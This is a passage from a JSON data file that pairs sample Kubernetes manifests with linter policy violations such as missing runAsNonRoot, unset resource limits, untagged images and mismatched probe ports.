    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hvpa-manager\" has memory limit 0"
  },
  {
    "id": "2093",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app2\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2094",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app2\" does not have a read-only root file system"
  },
  {
    "id": "2095",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app2\" is not set to runAsNonRoot"
  },
  {
    "id": "2096",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app2\" has cpu request 0"
  },
  {
    "id": "2097",
    "manifest_path": "data/manifests/the_stack_sample/sample_0508.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx\n        name: app2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app2\" has memory limit 0"
  },
  {
    "id": "2098",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2099",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2100",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2101",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2102",
    "manifest_path": "data/manifests/the_stack_sample/sample_0512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7005\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2103",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "2104",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2105",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "2106",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"captureorder\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "2107",
    "manifest_path": "data/manifests/the_stack_sample/sample_0514.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: shasbdois.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "2108",
    "manifest_path": "data/manifests/the_stack_sample/sample_0516.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: rabbitmq\n  labels:\n    name: rabbitmq\nspec:\n  ports:\n  - port: 5672\n    name: rabbitmq\n    targetPort: 5672\n  - port: 9090\n    name: exporter\n    targetPort: exporter\n    protocol: TCP\n  selector:\n    name: rabbitmq\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:rabbitmq])"
  },
  {
    "id": "2109",
    "manifest_path": "data/manifests/the_stack_sample/sample_0517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kuard-a\" does not have a read-only root file system"
  },
  {
    "id": "2110",
    "manifest_path": "data/manifests/the_stack_sample/sample_0517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kuard-a\nspec:\n  volumes:\n  - name: kuard-data\n    nfs:\n      server: ks101\n      path: /var/export\n  containers:\n  - image: gcr.io/kuar-demo/kuard-amd64:1\n    name: kuard-a\n    volumeMounts:\n    - mountPath: /data\n      name: kuard-data\n    resources:\n      requests:\n        cpu: 600m\n        memory: 128Mi\n      limits:\n        cpu: 1000m\n        memory: 256Mi\n    livenessProbe:\n      httpGet:\n        path: /healthy\n        port: 8080\n      initialDelaySeconds: 5\n      timeoutSeconds: 1\n      periodSeconds: 10\n      failureThreshold: 3\n    ports:\n    - containerPort: 8080\n      name: http\n      protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kuard-a\" is not set to runAsNonRoot"
  },
  {
    "id": "2111",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"sidecar-injector\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "2112",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sidecar-injector\" does not have a read-only root file system"
  },
  {
    "id": "2113",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vault-example-agent-injector\" not found"
  },
  {
    "id": "2114",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"sidecar-injector\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "2115",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sidecar-injector\" has cpu request 0"
  },
  {
    "id": "2116",
    "manifest_path": "data/manifests/the_stack_sample/sample_0518.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vault-example-agent-injector\n  labels:\n    app.kubernetes.io/name: vault-example-agent-injector\n    component: webhook\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: vault-example-agent-injector\n      component: webhook\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: vault-example-agent-injector\n        component: webhook\n    spec:\n      serviceAccountName: vault-example-agent-injector\n      securityContext:\n        runAsNonRoot: true\n        runAsGroup: 1000\n        runAsUser: 100\n      containers:\n      - name: sidecar-injector\n        image: hashicorp/vault-k8s:0.1.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: AGENT_INJECT_LISTEN\n          value: :8080\n        - name: AGENT_INJECT_LOG_LEVEL\n          value: info\n        - name: AGENT_INJECT_VAULT_ADDR\n          value: https://vault-example.vault-example.svc:8200\n        - name: AGENT_INJECT_VAULT_IMAGE\n          value: vault:1.3.1\n        - name: AGENT_INJECT_TLS_AUTO\n          value: vault-example-agent-injector-cfg\n        - name: AGENT_INJECT_TLS_AUTO_HOSTS\n          value: vault-example-agent-injector-svc,vault-example-agent-injector-svc.vault-example,vault-example-agent-injector-svc.vault-example.svc\n        args:\n        - agent-inject\n        - 2>&1\n        livenessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTPS\n          failureThreshold: 2\n          initialDelaySeconds: 2\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sidecar-injector\" has memory limit 0"
  },
  {
    "id": "2117",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goapp\" does not have a read-only root file system"
  },
  {
    "id": "2118",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goapp\" is not set to runAsNonRoot"
  },
  {
    "id": "2119",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"goapp\" has cpu request 0"
  },
  {
    "id": "2120",
    "manifest_path": "data/manifests/the_stack_sample/sample_0521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: goapp-deployment\nspec:\n  selector:\n    matchLabels:\n      app: goapp\n  template:\n    metadata:\n      labels:\n        app: goapp\n    spec:\n      containers:\n      - name: goapp\n        image: docker.pkg.github.com/kenji-kk/cicd-handson-2021-code/go-image:base\n        ports:\n        - containerPort: 9090\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"goapp\" has memory limit 0"
  },
  {
    "id": "2121",
    "manifest_path": "data/manifests/the_stack_sample/sample_0522.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: office\n  annotations:\n    traefik.backend.circuitbreaker: NetworkErrorRatio() > 0.5\nspec:\n  ports:\n  - name: http\n    targetPort: 80\n    port: 80\n  selector:\n    app: office\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:office])"
  },
  {
    "id": "2122",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"nginx-udp-ingress-lb\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "2123",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
